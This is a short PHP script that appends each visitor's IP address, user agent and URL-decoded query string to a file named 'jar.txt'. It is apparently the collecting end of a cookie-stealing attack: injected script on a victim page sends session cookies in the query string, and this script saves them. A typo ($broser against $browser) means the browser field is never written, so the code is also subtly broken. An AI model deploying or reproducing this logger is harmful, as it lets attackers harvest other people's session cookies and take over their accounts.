<?php 

$ip = $_SERVER['REMOTE_ADDR'];
$broser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "\n\n");
fclose($fp);
?>
